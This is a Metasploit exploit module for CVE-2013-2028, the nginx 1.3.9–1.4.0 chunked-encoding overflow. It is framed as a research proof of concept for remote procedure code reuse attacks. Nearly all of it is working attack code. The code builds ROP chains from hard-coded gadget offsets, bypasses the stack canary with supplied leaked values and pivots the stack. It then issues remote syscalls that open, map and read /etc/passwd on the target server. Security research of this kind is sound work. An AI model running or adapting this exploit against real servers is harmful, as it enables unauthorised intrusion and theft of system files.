##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp

  def initialize(info = {})

    super(update_info(info,
      'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding RPCRA',
      'Description'    => %q{
          This module exploits the vulnerability described in CVE-2013-2028
          on nginx 1.4.0, originally discovered by Greg MacManus, showcasing
          a practical Remote Procedure Code Reuse Attack. The exploit is based
          on Metasploit module nginx_chunked_size by hal and saelo. This
          version, however, requires an additional information leak that has
          not been implemented; canary value and code base address must be
          provided as options. In any case, the goal is to display the
          feasibility of RPCRAs once an attacker has partially mapped the
          memory space of the target process and has also achieved code
          reuse capabilities via ROP.
      },
      'Author'         =>
        [
          'Greg MacManus',    # original discovery
          'hal',              # original Metasploit module
          'saelo',            # original Metasploit module
          'Adrian Barreal',   # remote procedure code reuse attack PoC module
        ],
      'DisclosureDate' => 'May 07 2013',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-2028'],
          ['OSVDB', '93037'],
          ['URL', 'http://nginx.org/en/security_advisories.html'],
          ['PACKETSTORM', '121560']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'BadChars'    => "\x0d\x0a"
        },
      'Arch' => ARCH_CMD,
      'Platform' => 'unix',
      'Targets'        =>
        [
          # Default 1.4.0 source code build with gcc 7.4.0 in Ubuntu 18.04.
          [ 'Ubuntu 18.04 x64 - nginx 1.4.0, gcc 7.4.0', {
            'HeaderBufferSize' => 1024,
            'TargetBufferSize' => 4096,
            'TargetBufferToCanary' => 4104,
            'TargetBufferToReturn' => 4152,
            'TargetBufferToRequestObjectAddress' => 4352,
            'CodeBaseToGOTEntry' => 0x28eb80 + 0x18,
            'LibcAddressToSyscall' => 0x90295,
            'OriginalReturnTargetOffset' => 0x4172f
          }],
        ],

      'DefaultTarget' => 0
  ))

  register_options([
       OptPort.new('RPORT', [true, "The remote HTTP server port", 80]),
       OptInt.new("CANARY", [true, "Canary value, it must be leaked beforehand.", nil]),
       OptInt.new("CODE_BASE_ADDRESS", [true, "/usr/sbin/nginx module base address, it must be leaked beforehand.", nil]),
       OptInt.new("BUFFER_BASE_ADDRESS", [true, "Base address of the compromised buffer, it must be leaked beforehand.", nil])
    ])

  end

  #=============================================================================
  # check
  #
  def check
    begin
      res = send_request_fixed(nil)

      if res =~ /^Server: nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/m
        return Exploit::CheckCode::Appears
      elsif res =~ /^Server: nginx/m
        return Exploit::CheckCode::Detected
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error("Connection failed")
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  #=============================================================================
  # exploit
  #

  def remote_sys_getuid()
    output = remote_syscall({
      :rax => 102
    }, "", 8)
    return output.unpack('q<')[0]
  end

  def remote_sys_write(fd, buf_address, count, static_input = "")
    output = remote_syscall({
        :rax => 1,
        :rdi => fd,
        :rsi => buf_address,
        :rdx => count
      }, static_input, 8)
    return output.unpack('q<')[0]
  end

  def remote_sys_open(path_string, flags, mode = 0)
    output = remote_syscall({
        :rax => 2,            # sys_open
        :rdi => input_ref(0), # &path_string
        :rsi => flags,
        :rdx => mode
      }, path_string, 8)
    return output.unpack('q<')[0]
  end

  def remote_sys_memfd_create(name, flags)
    output = remote_syscall({
        :rax => 319,            # sys_memfd_create
        :rdi => input_ref(0),   # const char __user *uname_ptr
        :rsi => flags
      }, name, 8)
    return output.unpack('q<')[0]
  end

  def remote_sys_mmap(addr_hint, length, prot, flags, fd, offset)
    output = remote_syscall({
        :rax => 9, # sys_mmap
        :rdi => addr_hint,
        :rsi => length,
        :rdx => prot,
        :r10 => flags,
        :r8  => fd,
        :r9  => offset
      }, "", 8)
    return output.unpack('Q<')[0]
  end

  def remote_sys_close(fd)
    remote_syscall({
      :rax => 3, # sys_close
      :rdi => fd
    })
  end

  def remote_read(address, size)
    # Perform a harmless syscall and use the opportunity to read from address.
    output = remote_syscall({
      :rax => 39 # sys_getpid
    }, "", size, address)
    return output[0...size]
  end

  def exploit

    # Initialize the injector; it should then be ready to accept CRP calls.
    print_status "[*] Initializing injector."
    print_status "[ ]"
    initialize_injector()

    print_status "[*] sys_getuid: Retrieving worker process\' uid."
    uid = remote_sys_getuid()
    print_status "[-] ... uid: #{uid}"
    print_status "[ ]"

    print_status "[*] sys_open: Opening remote /etc/passwd for reading."
    fd = remote_sys_open("/etc/passwd\x00", 0, 0)
    print_status "[-] ... Descriptor: #{fd}"
    print_status "[ ]"

    print_status "[*] sys_mmap: Mapping /etc/passwd to process' memory."
    addr = remote_sys_mmap(0, 4096, 1, 2, fd, 0)
    print_status "[-] ... Base address: 0x#{addr.to_s(16)}"
    print_status "[ ]"

    print_status "[*] Reading 4096 bytes from address 0x#{addr.to_s(16)}."
    output = remote_read(addr, 4096)
    print_status "[-] Retrieved the following content:"
    output.each_line do |line|
      line = line.chomp
      print_status "[-] ... #{line[0...line.size]}"
    end

  end

  #=============================================================================
  # injector
  #
  HTTP_HEADER_SIZE = 70

  def initialize_injector
    @canary = datastore['CANARY']
    @code_base_address = datastore['CODE_BASE_ADDRESS']
    @buffer_base_address = datastore['BUFFER_BASE_ADDRESS']
    @chain_size = 8*create_chain({}).size
  end

  def input_ref(offset)
    return [:input_reference, offset]
  end

  def output_ref(offset)
    return [:output_reference, offset]
  end

  def available_input_space
    return target['TargetBufferSize'] - @chain_size
  end

  #---------------------------------------------------------------------------
  # random_chunk_size
  #
  # Generate a random chunk size that will always result in a negative 64bit
  # number when being parsed
  #
  def random_chunk_size(bytes=16)
    return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join
  end

  #---------------------------------------------------------------------------
  # send_request_fixed
  #
  def send_request_fixed(data, expected_data_length = 0)
    request =  "GET / HTTP/1.1\r\n"
    request << "Host: #{Rex::Text.rand_text_alpha(16)}\r\n"
    request << "Transfer-Encoding: Chunked\r\n"
    request << "\r\n"
    request << "#{data}"

    res = nil

    #---------------------------------------------------------------------------
    # Almost like original check call.
    if expected_data_length == 0
      begin
        connect
        sock.write(request)
        res = sock.get_once(-1, 0.5)
      rescue EOFError => e
        # Ignore
      ensure
        disconnect
      end
    #---------------------------------------------------------------------------
    # Attempt retrieving output data.
    #
    else
      loop do
        again = false
        res = ""
        connect
        sock.write(request)
        while res.size < expected_data_length
          begin
            res += sock.read(expected_data_length - res.size) || ""
            # The exploit has some reliability issues; sometimes it returns a
            # plain bad request. The server remains up and running, however,
            # so we can just send the syscall again until it works.
            if res.start_with?('HTTP/1.1')
              again = true
              break
            end
          rescue EOFError => e
            # Ignore
          end
        end
        disconnect
        break if !again
      end
    end

    return res
  end

  #---------------------------------------------------------------------------
  # Utility method to replace label symbols in arrays.
  #
  def replace(arr, symbol, value)
    arr[arr.index(symbol)] = value
  end

  def buff_offset(offset)
    return @buffer_base_address + offset
  end

  #---------------------------------------------------------------------------
  # Commonly used gadgets are encapsulated in methods for ease of change.
  #
  def pop_rax_ret
    @code_base_address + 0x8d4b0
  end

  def pop_rbx_ret
    @code_base_address + 0xd88d
  end

  def pop_rdi_ret
    @code_base_address + 0xe116
  end

  def pop_rsi_ret
    @code_base_address + 0x11b99
  end

  def load_rax(value)
    return [
      pop_rax_ret(),
      value
    ]
  end

  def load_rcx_unload_rbx(value)
    return [
      @code_base_address + 0x24820, # pop rcx ; add rsp, 0x10 ; pop rbx ; ret
      value,
      0,
      0,
      0
    ]
  end

  def load_rdi(value)
    return [
      pop_rdi_ret(),
      value
    ]
  end

  def load_rsi(value)
    return [
      pop_rsi_ret(),
      value
    ]
  end

  def load_rdx_unload_rax_rdi(value, snippet_base_address)
    snippet = [
      pop_rax_ret(),
      :value_address_rax,
      pop_rdi_ret(),
      :value_address_rdi,
      # mov rdx, qword ptr [rax + 8] ; mov qword ptr [rdi + 0x30], rdx ; ret
      @code_base_address + 0x118e7,
      @code_base_address + 0x26e29, # add rsp, 0x18 ; ret
      0,
      0,
      value
    ]
    value_address = snippet_base_address + 8*snippet.size - 8
    replace(snippet, :value_address_rax, value_address - 0x8)
    replace(snippet, :value_address_rdi, value_address - 0x30)
    return snippet
  end

  def load_r8_r9_unload_rax_rbx_rcx_rdx_rdi_rsi(r8, r9, snippet_base_address)
    base_addr = snippet_base_address

    chain = load_rdx_unload_rax_rdi(base_addr, base_addr)

    # The second stage loads r8, the loaded value is one less, however;
    # as the next stage increases r8; this stage is based on the
    # following gadget:
    # 0x000000000003ca36 : mov r8, rax ;
    #                      sub r8, rdi ;
    #                      mov qword ptr [rsi], r8 ;
    #                      add rax, 1 ;
    #                      sub rcx, rax ;
    #                      mov qword ptr [rdx], rcx ;
    #                      mov qword ptr [rdx + 8], rax ;
    #                      ret
    chain += [
      pop_rax_ret(),
      r8 - 1,
      pop_rdi_ret(),
      0,
      pop_rsi_ret(),
      base_addr, # notice that this snippet self destructs.
      @code_base_address + 0x3ca36 # the gadget above.
    ]

    # The third stage loads r9; it is based on the following gadget:
    # 0x000000000001106b : lea r9, [rcx + rax] ;
    #                      add r8, 1 ;
    #                      cmp r8, rdx ; jne 0x11055 ; mov rax, r9 ; ret
    chain += load_rdx_unload_rax_rdi(r8, base_addr += 8*chain.size)
    chain += load_rcx_unload_rbx(0) + [
      pop_rax_ret(),
      r9,
      @code_base_address + 0x1106b
    ]

    return chain
  end

  def load_r10_unload_rax_rbx_rdi(r10, snippet_base_address)
    snippet = [
      pop_rdi_ret(),
      :temp_storage,
      @code_base_address + 0x1276e, # mov qword ptr [rdi], r10 ; mov eax, 0 ; pop rbx ; ret
      r10,                          # stored in rbx for the moment.
      pop_rax_ret(),
      0,                            # value of r10 will be stored here.
      #
      # Original value of r10 is now in rax. Now, we want to subtract the actual
      # value that we want to store in r10 such that the upcoming sub
      # instruction leaves only that value in r10.
      #
      @code_base_address + 0x14936, # sub rax, rbx ; pop rbx ; ret
      0,
      #
      # Now we write the value in rax to the temporary storage.
      #
      @code_base_address + 0x45e8a, # mov qword ptr [rdi], rax ; ret
      #
      # Now we perform the actual write to r10.
      #
      pop_rdi_ret(),
      :temp_storage_minus_eight,
      # sub r10, qword ptr [rdi + 8] ;
      #     mov qword ptr [rdi], r10 ;
      #     mov eax, 0 ;
      #     pop rbx ;
      #     ret
      @code_base_address + 0x1276a,
      0
    ]
    replace(snippet, :temp_storage, snippet_base_address + 0x28)
    replace(snippet, :temp_storage_minus_eight, snippet_base_address + 0x20)
    return snippet
  end

  #---------------------------------------------------------------------------
  # This prologue is the first chain to execute. It will perform a quick
  # stack pivot to make rsp point to the beginning of the target buffer.
  #
  def build_prologue
    return [
      @code_base_address + 0xdce9, # pop rsp ; ret
      @buffer_base_address
    ]
  end

  #---------------------------------------------------------------------------
  # There is no usable syscall instruction in nginx source code.
  # To perform the syscall, we have to locate libc first.
  #
  # To locate libc, we have to load some pointer from the stack into
  # some register, then add an offset, and then finally jump. However,
  # before jumping, we have to restore those registers that were unloaded.
  #
  def rbx_syscall_addr_unload_rax_rdx_rdi_rsi(snippet_base_address)
    chain = [
      pop_rax_ret(),
      @code_base_address + target['CodeBaseToGOTEntry'] - 8,
      pop_rdi_ret(),
      snippet_base_address - 0x30,
      # mov rdx, qword ptr [rax + 8] ; mov qword ptr [rdi + 0x30], rdx ; ret
      @code_base_address + 0x118e7,
      # Pointer into libc is now in rdx. We may now add the offset into
      # the syscall gadget and get it stored in some other register in
      # which we can keep the value without losing it.
      #
      pop_rax_ret(),
      target['LibcAddressToSyscall'],
      @code_base_address + 0x3e955, # add rax, rdx ; add rsp, 8 ; ret
      0,
      # Final pointer is in rax. We move it now to rbx to finish.
      pop_rdi_ret(),
      :tmp_storage,
      @code_base_address + 0x45e8a, # mov qword ptr [rdi], rax ; ret
      pop_rbx_ret(),
      0 # Temporary storage, final address will be stored here.
    ]
    replace(chain, :tmp_storage, snippet_base_address + 8*chain.size - 8)
    return chain
  end

  def jump_to_rbx
    return [
      @code_base_address + 0x79627 # jmp rbx
    ]
  end

  def save_rax_to_output
    return [
      pop_rdi_ret(),
      output_ref(0),
      @code_base_address + 0x45e8a # mov qword ptr [rdi], rax ; ret
    ]
  end

  def build_epilogue(snippet_base_address, read_back_length = 0, read_address = 0)
    chain = []
    offset_to_req = target['TargetBufferToRequestObjectAddress']
    read_target = read_address != 0 ? read_address : output_ref(0)
    read_chain = load_rdx_unload_rax_rdi(read_back_length, snippet_base_address)
    read_chain += [
      # Load request object address into some register.
      pop_rax_ret(),
      @buffer_base_address + offset_to_req - 8,
      @code_base_address + 0x442f8, # mov rax, qword ptr [rax + 8] ; ret
      #
      # Request object address is now in rax. Connection pointer is 8 bytes
      # above. We may use the same gadget again to get connection pointer.
      @code_base_address + 0x442f8, # mov rax, qword ptr [rax + 8] ; ret
      #
      # Connection object address is in rax. We need to store it in stack
      # for it to be popped later into rdi.
      #
      pop_rdi_ret(),
      :temp_storage,
      @code_base_address + 0x45e8a, # mov qword ptr [rdi], rax ; ret
      #
      # Connection object has been stored in chain to be popped into rdi
      # later. Connection object address is still in rax; we need to add 0x28
      # bytes to get to send pointer, which we will need to call later.
      pop_rbx_ret(),
      0x20, # 0x8 will be added by load gadget.
      @code_base_address + 0x26e80, # add rax, rbx ; pop rbx ; ret
      0,
      @code_base_address + 0x442f8, # mov rax, qword ptr [rax + 8] ; ret
      #
      # Send function address is now in rax. We need to load remaining
      # arguments to send output through socket.
      pop_rdi_ret(),
      0, # temp_storage target; :temp_storage will point here.
      pop_rsi_ret(),
      read_target,
      @code_base_address + 0x7f267 # jmp rax
    ]

    if read_back_length > 0
      chain += read_chain
      replace(chain, :temp_storage, snippet_base_address + 8*chain.size - 0x20)
    else
      # mov eax, 0 ; ret, essentially a nop, as many of them as required
      # for read back chains and non read back chains to be of the same size.
      # This must be done to keep chain size constant between multiple calls.
      chain += [@code_base_address + 0xdc0c]*read_chain.size
    end

    original_ret_address = @code_base_address + target['OriginalReturnTargetOffset']
    original_ret_address_loc = @buffer_base_address + target['TargetBufferToReturn']
    chain += [
      pop_rax_ret(),
      original_ret_address,
      pop_rdi_ret(),
      original_ret_address_loc,
      @code_base_address + 0x45e8a, # mov qword ptr [rdi], rax ; ret
      #
      # Load a value in rax that will make execution continue normally.
      pop_rax_ret(),
      0x190,
      #
      # Set rsp to original return address with a pivot.
      @code_base_address + 0xdce9, # pop rsp ; ret
      original_ret_address_loc
    ]

    return chain
  end

  def create_chain(regs, read_back_length = 0, read_address = 0)
    # Create actual payload chain that will go inside stack buffer.
    rax = regs[:rax] || 102
    rdi = regs[:rdi] || 0
    rsi = regs[:rsi] || 0
    rdx = regs[:rdx] || 0
     r8 = regs[:r8 ] || 0
     r9 = regs[:r9 ] || 0
    r10 = regs[:r10] || 0

    chain = []
    chain += load_r8_r9_unload_rax_rbx_rcx_rdx_rdi_rsi(
      r8,
      r9,
      buff_offset(8*chain.size))

    chain += load_r10_unload_rax_rbx_rdi(
      r10,
      buff_offset(8*chain.size))

    chain += rbx_syscall_addr_unload_rax_rdx_rdi_rsi(
      buff_offset(8*chain.size))

    chain += load_rdx_unload_rax_rdi(
      rdx,
      buff_offset(8*chain.size))

    chain += load_rax(rax)
    chain += load_rdi(rdi)
    chain += load_rsi(rsi)

    chain += jump_to_rbx()
    chain += save_rax_to_output()
    chain += build_epilogue(
      buff_offset(8*chain.size),
      read_back_length,
      read_address)

    # Make sure that chain's size is a multiple of 16, to avoid any issue
    # with xmm operations.
    #
    if 8*chain.size % 16 != 0
      chain.push(0)
    end

    return chain
  end

  #===========================================================================
  # Perform actual remote syscall; builds the generic CRP payload, gets
  # it injected, and then reads awaiting for the output response.
  #
  def remote_syscall(regs, static_data_string = "", read_back_length = 0, read_address = 0)

    # To make the exploit reliable, read_back_length should be at least 8.
    # Check send_request_fixed algorithm to see why.
    read_back_length = (read_back_length + 7) & (-8)

    # Create initial data stream to induce overflow.
    input = random_chunk_size(target['HeaderBufferSize'] - HTTP_HEADER_SIZE)
    chain = create_chain(regs, read_back_length, read_address)

    # Replace input data address labels.
    input_data_base = @buffer_base_address + 8*chain.size
    chain.each_with_index { |entry, i|
      if entry.kind_of?(Array) && entry[0] == :input_reference
        chain[i] = input_data_base + entry[1]
      end
    }

    # Chain has been built for its size to be a multiple of 16. Now,
    # we also want input data section to be of size multiple of 16
    # since output data section will come right after.
    input_data_size = (static_data_string.size + 15) & (-16)

    # Replace output data address labels.
    consumed_buffer_space = @chain_size + input_data_size
    output_data_base = @buffer_base_address + consumed_buffer_space
    chain.each_with_index { |entry, i|
      if entry.kind_of?(Array) && entry[0] == :output_reference
        chain[i] = output_data_base + entry[1]
      end
    }

    # Append chain and input data section to input sequence.
    #
    input << chain.pack('Q<*')
    input << static_data_string
    input << "\x00"*(input_data_size - static_data_string.size)

    if input.size > target['TargetBufferSize']
      raise "Input data too large."
    end

    # Add data up to canary.
    #
    to_canary = target['HeaderBufferSize'] + target['TargetBufferToCanary']
    input << Rex::Text.rand_text_alpha(to_canary - input.size - HTTP_HEADER_SIZE)
    input << [@canary].pack('Q<')

    # Add remaining filler up to return address.
    #
    to_return = target['TargetBufferToReturn'] - target['TargetBufferToCanary'] - 8
    input << Rex::Text.rand_text_alpha(to_return)

    # Append prologue, which will begin from return address.
    #
    input << build_prologue().pack('Q<*')

    # Perform actual remote call.
    #
    return send_request_fixed(input, read_back_length)
  end

end
